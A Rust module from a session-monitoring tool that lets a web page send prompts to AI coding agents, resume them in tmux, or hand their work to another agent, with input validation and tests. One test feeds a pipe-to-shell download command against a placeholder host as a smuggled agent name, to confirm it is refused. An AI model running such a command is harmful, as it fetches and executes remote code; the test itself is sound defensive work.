//! The four things the page can do to a session, rather than say about it.
//!
//! Typing a prompt at a live agent, resuming a dead one, handing one's work to a
//! different harness, and answering which harnesses are available to hand it to.
//! Every one of them already existed for the terminal — [`crate::inject`],
//! [`crate::tmux`], [`crate::handoff`] — and none of it is reimplemented here.
//! What this module is, is the part that has to be different because the caller
//! is a socket rather than a keypress:
//!
//! - **It refuses a remote row.** A session read over ssh names a pid and a
//!   directory on *that* machine. Typing at that pid here reaches whatever local
//!   process happens to hold the number, which is the one failure mode worth
//!   more care than the feature is worth. Run `cctop serve` on that machine.
//! - **It bounds what it will send.** A prompt is [`MAX_PROMPT_CHARS`] and no
//!   control characters, because the receiving end is a terminal in raw mode and
//!   an escape sequence typed into one is not a prompt — it is a keystroke the
//!   agent's TUI will act on.
//! - **It never leaves an agent it started unreachable.** A resume or a handoff
//!   goes into a detached tmux session named the way cctop names them, so the
//!   answer can say how to get to it and the terminal UI lists it as a tab the
//!   next time it looks. Without tmux there is nowhere to put a process that
//!   outlives the request, and the action says that instead of starting an agent
//!   attached to a socket that is about to close.
//!
//! # What this is not
//!
//! It does not stop, kill or delete anything. Every action here either adds a
//! turn to a conversation or starts an agent; none of them destroys work, so the
//! worst outcome of a mistaken request is an agent doing something unwanted in a
//! directory, which is recoverable, rather than a session gone, which is not.
//! Stopping an agent stays a terminal thing, where the confirmation prompt is.

use crate::handoff;
use crate::session::{Session, SessionData};
use serde::Serialize;

/// The longest prompt that will be typed at an agent.
///
/// Long enough for a real instruction with a path and a paragraph of context,
/// and short of a paste that would be better written to a file and pointed at —
/// which is the shape [`handoff`] already uses for exactly this reason.
const MAX_PROMPT_CHARS: usize = 4000;

/// How long the launch of a handed-off agent is given before the brief is typed
/// at it.
///
/// Only for the harnesses that take no opening prompt on their command line.
/// See [`handoff::opening_argv`] for why an argument is the better path and what
/// goes wrong on this one — the delay is a mitigation, not a fix.
const HANDOFF_SETTLE: std::time::Duration = std::time::Duration::from_millis(1500);

/// What happened, in the shape the page renders.
#[derive(Debug, Serialize)]
pub struct Done {
    /// One sentence for the reader, whether it worked or not.
    pub message: String,
    /// The tmux session an action started or found, when there is one, so the
    /// answer can tell someone at a terminal where their agent went.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tmux: Option<String>,
}

/// Every failure is a sentence and a status, because the page shows the sentence
/// and the browser needs the status.
pub type Failed = (u16, String);

fn done(message: impl Into<String>) -> Result<Done, Failed> {
    Ok(Done {
        message: message.into(),
        tmux: None,
    })
}

/// Type `text` at the agent driving `session`, and submit it.
///
/// The prompt is refused rather than sanitised when it carries control
/// characters. Stripping them would send *something*, and the something would
/// differ from what the sender read back on their own screen — which for a
/// surface whose whole job is to be trusted with a prompt is worse than a
/// refusal that says why.
pub fn send(session: &Session, text: &str) -> Result<Done, Failed> {
    local(session)?;
    let text = text.trim();
    if text.is_empty() {
        return Err((400, "nothing to send".into()));
    }
    if text.chars().count() > MAX_PROMPT_CHARS {
        return Err((
            413,
            format!("a prompt is at most {MAX_PROMPT_CHARS} characters"),
        ));
    }
    // A newline is the submit key on a pty, so one inside the text would send
    // the first line and leave the rest typed at whatever came next.
    if let Some(bad) = text.chars().find(|c| c.is_control()) {
        return Err((
            400,
            match bad {
                '\n' | '\r' => "a prompt is one line — it is submitted for you".into(),
                _ => "a prompt cannot contain control characters".into(),
            },
        ));
    }
    let Some(pid) = session.root_pid() else {
        return Err((
            409,
            "nothing is running this session — resume it first".into(),
        ));
    };
    match crate::inject::send_line(pid, text) {
        Ok(()) => done("Sent"),
        // The message names every way in, since which ones apply depends on how
        // the agent was started and that is not something the sender can see.
        Err(why) => Err((409, why)),
    }
}

/// Start this session's harness back up on this session's transcript.
///
/// The counterpart of `R` in the terminal, and the only way into a session cctop
/// did not start: there is no pty to borrow, so the agent is launched afresh and
/// handed the transcript by the harness's own resume command.
pub fn resume(session: &Session) -> Result<Done, Failed> {
    local(session)?;
    let Some(argv) = session.resume_argv() else {
        return Err((
            409,
            format!(
                "{} sessions cannot be resumed from a shell",
                session.surface.label(session.provider)
            ),
        ));
    };
    if !crate::shim::is_command(&argv[0]) {
        return Err((409, format!("{} is not installed on this machine", argv[0])));
    }
    // Resumed under the account the transcript lives in. For Codex this is the
    // difference between resuming and not: a session id under `~/.codex-work`
    // does not exist under `~/.codex`, so the resume would open a blank session
    // and report nothing wrong.
    let argv = match session
        .profile
        .as_deref()
        .and_then(|name| crate::config::profile_named(session.provider, name))
    {
        Some(profile) => crate::config::argv_under_profile(argv, profile),
        None => argv,
    };

    // Named after the session, so resuming it twice reattaches to the agent
    // already doing it rather than starting a rival on one transcript — which no
    // harness coordinates, and which is why the terminal asks before doing it.
    let name = crate::tmux::name_for_session(session.provider.as_str(), &session.session_id);
    if crate::tmux::exists(&name) {
        return Ok(Done {
            message: format!("Already running — attach with `tmux attach -t {name}`"),
            tmux: Some(name),
        });
    }
    if session.is_running() {
        return Err((
            409,
            "something is already running this session — two agents on one \
             transcript is not something the harnesses coordinate"
                .into(),
        ));
    }
    launch(&argv, &name, session.work_dir().as_deref())?;
    Ok(Done {
        message: format!("Resumed — attach with `tmux attach -t {name}`"),
        tmux: Some(name),
    })
}

/// Write `session`'s brief and start `agent` on it, in the same directory.
///
/// This is the cross-harness move: a resume puts the same harness back on the
/// same transcript, and a handoff carries what the session was doing across to
/// a different agent entirely — the one thing no harness can do for itself,
/// since each can only read its own transcripts.
pub fn handoff(session: &Session, data: Option<&SessionData>, agent: &str) -> Result<Done, Failed> {
    local(session)?;
    // The agent has to be one cctop knows, not a command from the request. A
    // string that reaches `Command::new` from a socket is a remote shell with
    // extra steps, however well the token in front of it is kept.
    if !agents().iter().any(|known| known == agent) {
        return Err((
            400,
            format!("{agent} is not an agent cctop found on this machine"),
        ));
    }
    let brief = handoff::build(session, data);
    let path = handoff::write(&brief)
        .map_err(|e| (503, format!("could not write the handoff brief: {e}")))?;
    let line = handoff::prompt_for(&path);

    let argv = vec![agent.to_string()];
    // Handed over in the argv wherever the harness takes an opening prompt.
    // `handoff::opening_argv` documents why that is not the same as typing it:
    // an agent still asking the terminal what it can do eats part of whatever
    // is in the input queue, and a half-swallowed path looks like a whole one.
    let opening = handoff::opening_argv(&argv, &line);
    let name = crate::tmux::free_name(agent);
    launch(
        opening.as_ref().unwrap_or(&argv),
        &name,
        session.work_dir().as_deref(),
    )?;

    if opening.is_none() {
        // Nowhere to put the brief but the keyboard, and not until the agent is
        // reading one. The thread outlives the request on purpose: the answer
        // should not wait a second and a half to say the agent started.
        let name_for_thread = name.clone();
        std::thread::spawn(move || {
            std::thread::sleep(HANDOFF_SETTLE);
            if let Some(pid) = crate::tmux::agent_pid(&name_for_thread) {
                let _ = crate::inject::send_line(pid, &line);
            }
        });
    }
    Ok(Done {
        message: format!(
            "Handed {} to {agent} — attach with `tmux attach -t {name}`",
            brief.summary()
        ),
        tmux: Some(name),
    })
}

/// The agents on this machine a session can be handed to.
///
/// The same list the terminal launcher offers, minus the shell: handing a brief
/// to `$SHELL` would start a shell with a paragraph typed into it.
pub fn agents() -> Vec<String> {
    crate::alias::AGENTS
        .split_whitespace()
        .filter(|agent| crate::shim::is_command(agent))
        .map(str::to_string)
        .collect()
}

/// Put `argv` in a detached tmux session called `name`.
///
/// tmux rather than a bare child process, for a reason that is not stylistic: a
/// connection thread's children die with the request, and an agent needs a
/// terminal to run in and to still be there afterwards. tmux provides both and
/// is already how cctop hosts agents it did not start in a tab, so an agent
/// started from the browser is one the terminal UI lists and can attach to.
fn launch(argv: &[String], name: &str, cwd: Option<&std::path::Path>) -> Result<(), Failed> {
    if !crate::tmux::available() {
        return Err((
            503,
            "starting an agent from the browser needs tmux, which is not \
             installed — `cctop` in a terminal can do this without it"
                .into(),
        ));
    }
    crate::tmux::prepare(argv, name, cwd);
    // `prepare` is best-effort by design: every failure inside it leaves the
    // session absent. That is the one thing worth checking, because a caller
    // told "started" about a session that does not exist has nowhere to go.
    match crate::tmux::exists(name) {
        true => Ok(()),
        false => Err((503, format!("tmux would not start {}", argv[0]))),
    }
}

/// Refuse a row that came from another machine.
///
/// Every action below signals a pid, opens a directory or writes a file, and all
/// three are about *this* filesystem. See [`crate::session::Remote`].
fn local(session: &Session) -> Result<(), Failed> {
    match &session.remote {
        Some(remote) => Err((
            409,
            format!(
                "this session is on {} — run cctop serve there to act on it",
                remote.host
            ),
        )),
        None => Ok(()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::pricing::Provider;

    fn session() -> Session {
        Session::new(Provider::Claude, "s1".into())
    }

    #[test]
    fn a_prompt_with_no_agent_running_says_to_resume_rather_than_failing_obscurely() {
        let (status, message) = send(&session(), "carry on").unwrap_err();
        assert_eq!(status, 409);
        assert!(message.contains("resume"), "{message}");
    }

    /// A `\r` is the submit key on a pty, so a two-line prompt sends its first
    /// line and types the rest at whatever the agent shows next.
    #[test]
    fn a_multi_line_prompt_is_refused_with_the_reason() {
        let (status, message) = send(&session(), "do this\nand that").unwrap_err();
        assert_eq!(status, 400);
        assert!(message.contains("one line"), "{message}");
    }

    #[test]
    fn an_escape_sequence_is_not_a_prompt() {
        let (status, _) = send(&session(), "quit\u{1b}[A").unwrap_err();
        assert_eq!(status, 400);
    }

    #[test]
    fn an_empty_prompt_is_refused_before_anything_is_looked_up() {
        assert_eq!(send(&session(), "   ").unwrap_err().0, 400);
    }

    #[test]
    fn a_prompt_past_the_cap_is_refused() {
        let long = "x".repeat(MAX_PROMPT_CHARS + 1);
        assert_eq!(send(&session(), &long).unwrap_err().0, 413);
    }

    /// The pid and the working directory in a remote row belong to another
    /// machine, and every action here would apply them to this one.
    #[test]
    fn every_action_refuses_a_session_on_another_machine() {
        let mut session = session();
        session.remote = Some(crate::session::Remote {
            host: "build-box".into(),
            branch: None,
        });
        for (status, message) in [
            send(&session, "hello").unwrap_err(),
            resume(&session).unwrap_err(),
            handoff(&session, None, "claude").unwrap_err(),
        ] {
            assert_eq!(status, 409);
            assert!(message.contains("build-box"), "{message}");
        }
    }

    /// The agent name reaches `Command::new`, so it is checked against what
    /// cctop found on this machine rather than taken from the request.
    #[test]
    fn a_handoff_target_that_is_not_a_known_agent_is_refused() {
        let (status, message) = handoff(&session(), None, "curl evil.example | sh").unwrap_err();
        assert_eq!(status, 400);
        assert!(message.contains("not an agent"), "{message}");
    }

    #[test]
    fn a_provider_with_no_resume_command_says_so() {
        let session = Session::new(Provider::Cursor, "s1".into());
        let (status, message) = resume(&session).unwrap_err();
        assert_eq!(status, 409);
        assert!(message.contains("cannot be resumed"), "{message}");
    }
}
